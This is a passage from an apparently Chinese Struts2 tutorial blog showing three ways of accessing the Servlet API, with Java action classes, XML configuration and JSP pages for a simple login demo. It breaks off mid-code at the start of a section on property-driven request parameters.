class="headerlink" title="访问Servlet API的方法"></a>访问Servlet API的方法</h2><h3 id="通过ActionContext类访问"><a href="#通过ActionContext类访问" class="headerlink" title="通过ActionContext类访问"></a>通过ActionContext类访问</h3><p>truts2提供了ActionContext类，struts2可以通过该类来实现与Servlet API的访问。</p><p>ActionContext类提供了如下几种方法：<br>| 方法说明                             | 功能描述                                                     |<br>| ———————————— | ———————————————————— |<br>| Object get(Object key)               | 类似于调用HttpServletRequest的getAttribute(String name)方法  |<br>| Map getApplication()                 | 返回一个Map对象，该对象模拟了该应用的ServletContext实例      |<br>| static ActionContext getContext()    | 这是个静态方法 获取系统的ActionContext实例                   |<br>| Map getParameters()                  | 获取所有的请求参数，类似于调用HttpServletRequest对象的getParameterMap()方法 |<br>| Map getSession（）                   | 返回一个Map对象，该对象模拟了HttpSession 实例                |<br>| void setApplication(Map application) | 传入一个Map实例，将Map实例的key-value转换成application的属性名-值。 |<br>| void setSession(Map session)         | 传入一个Map实例，将Map实例的key-value转换成application的属性名-值。 |</p><p>实例1：通过ActionContext类实现登陆</p><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.action;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> String username;</span><br><span class="line"><span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.password = password;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ActionContext context=ActionContext.getContext();</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>.equals(username)&amp;&amp;<span class="string">&quot;123456&quot;</span>.equals(password))&#123;</span><br><span class="line">context.put(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">context.put(<span class="string">&quot;password&quot;</span>, password);</span><br><span class="line">context.put(<span class="string">&quot;success&quot;</span>, <span class="string">&quot;用户登录成功！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">context.put(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;用户登录失败！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>FirstStruts2<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.htm<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>default.html<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>default.htm<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>default.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置Struts2核心过滤器--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定Struts2配置文件的D2T信息 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;LoginDemo&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">    pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>登陆页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">账号:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">    pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>登陆成功页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">algin</span>=<span class="string">center</span>&gt;</span>通过ActionContext类访问Servelt API<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>$&#123;success &#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>用户登录信息<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">用户名:$&#123;username &#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密    码:$&#123;password &#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>error.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">    pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>登陆失败页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>$&#123;error &#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发布项目访问login.jsp<br><img src="https://img-blog.csdnimg.cn/20210326201914583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入错误的账号密码，提示登陆失败<br><img src="https://img-blog.csdnimg.cn/20210326201922847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入正确的用户名admin和密码123456，提示登陆成功<br><img src="https://img-blog.csdnimg.cn/20210326201939672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从返回用户信息，可以看出来，在Action中放入ActionContext的key-value键值对被提取出来了，说明struts2可以通过ActionContext类访问Servlet API。</p><h3 id="通过特定接口访问"><a href="#通过特定接口访问" class="headerlink" title="通过特定接口访问"></a>通过特定接口访问</h3><p>Struts2框架提供了ActionContext来访问Servlet API，但无法直接获得Servlet API实例，Struts2提供如下几个接口使Action可以直接访问到Servlet API：</p><table><thead><tr><th>接口</th><th>功能描述</th></tr></thead><tbody><tr><td>ServletContextAware</td><td>实现该接口的Action可以直接访问Web应用的ServletContext实例</td></tr><tr><td>ServletRequestAware</td><td>实现该接口的Action可以直接访问Web应用的ServletRequest实例</td></tr><tr><td>ServletResponseAware:</td><td>实现该接口的Action可以直接访问Web应用的ServletRsponse实例</td></tr></tbody></table><p>实例2：</p><p>AwareAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.action;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AwareAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> <span class="keyword">implements</span> <span class="title">ServletRequestAware</span></span>&#123;</span><br><span class="line">HttpServletRequest request;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setServletRequest</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.request=request;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;通过ServletRequestAware接口实现了访问Servlet API的访问&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;AwareDemo&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;aware&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.AwareAction&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/message.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>message.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">algin</span>=<span class="string">&quot;center&quot;</span>&gt;</span>$&#123;requestScope.message&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发布项目，访问aware<br><img src="https://img-blog.csdnimg.cn/20210326204201290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出，使用ServletRequestAware接口顺利访问Servlet API了的</p><h3 id="通过ServletActionContext访问"><a href="#通过ServletActionContext访问" class="headerlink" title="通过ServletActionContext访问"></a>通过ServletActionContext访问</h3><p>Struts2还提供了一个ServletActionContext工具类用来访问Servlet API。该类包含了一下几个静态方法：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>static PageContext getPageContext()</td><td>取得Web应用的PageContext对象</td></tr><tr><td>static HttpServletRequest getRequest()</td><td>取得Web应用的?HttpServletRequest对象</td></tr><tr><td>static HttpServletResponse getResponse()</td><td>取得Web应用的HttpServletResponse对象</td></tr><tr><td>static ServletContext getServletContext()</td><td>取得Web应用的ServletContext对象</td></tr></tbody></table><p>实例3：<br>ContextAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.action;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.ServletActionContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionContext;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContextAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">ServletActionContext.getRequest().setAttribute(<span class="string">&quot;message&quot;</span>, </span><br><span class="line"><span class="string">&quot;通过ServletActionContext类直接访问Servlet API&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;ContextDemo&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;context&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.ContextAction&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/context.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>context.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">algin</span>=<span class="string">center</span>&gt;</span>$&#123;requestScope.message&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发布项目，访问context<br><img src="https://img-blog.csdnimg.cn/20210326204934276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>借助ServletActionContext类的帮助，也可以在Action中直接访问Servlet API，避免了Action实现AxxAction等接口。</p><p>在开发中应优先使用ActionContext来避免和Servlet API耦合</p><h2 id="Aciton处理请求参数"><a href="#Aciton处理请求参数" class="headerlink" title="Aciton处理请求参数"></a>Aciton处理请求参数</h2><p>在Struts2中，页面的请求数据和Action有两种基本的对应方式，分别是字段驱动(FileldDriven)方式和模型驱动(ModelDriven)方式。其中，字段驱动也叫做为属性驱动。</p><h3 id="属性驱动"><a href="#属性驱动" class="headerlink" title="属性驱动"></a>属性驱动</h3><p>  1.基本数据类型字段驱动方式的数据传递:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.hjc.Action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActionOne</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> String UserName;</span><br><span class="line"><span class="keyword">private</span> String PassWord;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUserName</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> UserName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserName</span><span class="params">(String userName)</span> </span>&#123;</span><br><span class="line">UserName = userName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span 